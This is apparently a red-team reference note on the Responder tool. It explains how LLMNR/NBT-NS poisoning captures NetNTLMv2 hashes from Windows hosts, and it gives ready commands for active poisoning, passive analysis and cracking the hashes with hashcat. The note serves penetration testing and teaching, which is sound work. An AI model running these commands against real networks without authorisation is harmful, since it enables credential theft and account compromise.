---
type: tool
room: red
tool_name: "responder"
version: "v3.1.x"
platform: [Linux]
phase: [Credential Access]
tags: [red/tool, red/mitm, red/credential-access, llmnr-poisoning, ntlmv2]
date_added: 2026-10-30
last_reviewed: 2026-10-30
---

# Responder

> [!quote]
> *"It has long been an axiom of mine that the little things are infinitely the most important."*

**Room:** Red — Instruments | **Phase(s):** `Credential Access` | **Platform:** `Linux`

---

## The Instrument *(What It Is)*

`Responder` is an LLMNR, NBT-NS, and MDNS poisoner designed to exploit Windows broadcast name resolution fallback. When a Windows workstation attempts to reach a non-existent network share (e.g. `\\typo-share\files`), it falls back to broadcasting LLMNR/NBT-NS requests. Responder answers these requests, tricks the victim into authenticating against its rogue authentication servers, and captures the victim's NetNTLMv2 hash or relays them.

- **Author / Origin:** Laurent Gaffié (@lgandx)
- **License:** GNU GPL v3
- **Install:** Pre-installed on Kali Linux / `sudo apt install responder`

---

## The Method *(Core Usage)*

### Basic Syntax
```bash
sudo responder -I <interface> [options]
```

### Key Flags

| Flag | Meaning |
|------|---------|
| `-I <iface>` | Network interface to listen on (e.g. `eth0`) |
| `-A` | Analyze mode: passively listens to LLMNR/NBT-NS without poisoning |
| `-w` | Start rogue WPAD (Web Proxy Auto-Discovery) rogue server |
| `-d` | Enable DHCP answers for rogue server injection |
| `-r` | Enable answers for netbios wredir queries |
| `-v` | Verbose output |

---

## The Cases *(Common Use-Patterns)*

### Case 1 — Active Poisoning & NetNTLMv2 Hash Capture
```bash
# Start active poisoning on interface eth0
sudo responder -I eth0 -dwv

# Hashes captured are automatically logged to:
# /usr/share/responder/logs/SMB-NTLMv2-SSP-<IP>.txt
```

### Case 2 — Cracking Captured NetNTLMv2 Hashes
```bash
# Crack the captured hash using Hashcat mode 5600
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt /usr/share/wordlists/rockyou.txt
```

### Case 3 — Passive Network Analysis (Noisy Detection Avoidance)
```bash
# Run in passive analysis mode to see who is querying without sending poison responses
sudo responder -I eth0 -A
```

---

## MITRE ATT&CK Mapping

| Technique ID | Technique Name |
|-------------|----------------|
| `T1557.001` | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay |
| `T1003` | OS Credential Dumping |

---

## Related Notes

- [[Red/Instruments/hashcat|hashcat]]
- [[Red/Instruments/netexec|netexec]]
- [[Red/Monographs/TA0006 - Credential Access|TA0006 — Credential Access]]

↩ [[Red/Instruments/readme|Red: Instruments]] · [[Red/Red|Red]] · [[Mind Palace]]
